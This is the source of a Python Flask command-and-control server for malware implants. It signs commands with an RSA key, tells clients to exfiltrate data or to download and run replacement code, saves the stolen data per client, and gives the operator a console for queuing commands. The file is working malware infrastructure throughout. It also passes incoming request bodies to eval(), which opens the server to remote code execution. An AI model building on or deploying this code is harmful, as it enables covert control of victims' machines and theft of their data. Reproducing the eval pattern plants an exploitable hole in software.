from time import time
from enum import Enum
from base64 import b64encode
from threading import *
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import padding
from flask import Flask, request
from pathlib import Path
import os

class Command(Enum):
    NOP = "nop"
    EXFILTRATE = "exfiltrate"
    UPDATE = "code_update"

# Read in the private key
with open("privatekey.pem", "rb") as key_file:
    private_key = serialization.load_pem_private_key(
        key_file.read(),
        password=None
    )
# Dictionary of client id to curent command
client_commands = {}
app = Flask(__name__)

"""
Builds an encrypted response string with a signature, nonce, id, and command field, and
an optional body; fields are delimited by newline characters
https://cryptography.io/en/latest/hazmat/primitives/asymmetric/rsa/
"""
def build_response(id, command):
    response = f"{int(time())}\n{id}\n{command.value}\n"    
    if command == Command.UPDATE:
        try:
            new_code = Path(".", f"{id}/src.py").read_text()
            response += new_code + "\n"
        except IOError:
            print(f"[build_response] ERROR: could not find file ./{id}/src.py to return in {command}; issuing {Command.NOP} instead")
            return build_response(id, Command.NOP)
    signature = private_key.sign(
        response.encode("utf-8"),
        padding.PSS(
            mgf=padding.MGF1(hashes.SHA256()),
            salt_length=padding.PSS.MAX_LENGTH
        ),
        hashes.SHA256()
    )
    return str(b64encode(signature), encoding="utf-8") + "\n" + response

def handle_heartbeat(id):
    command = client_commands[id] if id in client_commands else Command.NOP
    print(f"[handle_heartbeat] received heartbeat from {id}; sending command {command.value}")
    # Overwrite the command so that we do not reply to the next heartbeat with the same operation
    client_commands[id] = Command.NOP    
    msg = build_response(id, command)
    print(msg)
    return msg

def handle_exfiltrate(id):
    print(f"[handle_exfiltrate] received exfiltrate response from {id}")
    # convert bytes -> string then eval string as a python expression representing
    # a dict and then access the "data" key of the evaluated dict
    payload = eval(str(request.data, "utf-8"))["data"]
    outfile_path = f"{id}/exfiltrate.txt"
    os.makedirs(os.path.dirname(outfile_path), exist_ok=True)
    with open(outfile_path, "w") as f:
        f.write(payload)
    return "success"

@app.route("/sync/<id>", methods=["GET", "POST"])
def login(id):
    if request.method == "GET":
        return handle_heartbeat(id)
    else:
        return handle_exfiltrate(id)

def cli():
    while True:
        args = input().split()
        if args[0] != "command" or len(args) < 3:
            print("[cli] ERROR: invalid command; usage: `command {id} {command}`")
            continue
        id = args[1]
        command = args[2]
        try:
            client_commands[id] = Command(command)
            print(f"[cli] successfully updated client {id}'s next command to {command}\n{client_commands}")
        except:
            print(f"[cli] ERROR: {command} is not a valid Command; try one of: {[command.value for command in Command]}")

Thread(target=cli, daemon=True).start()
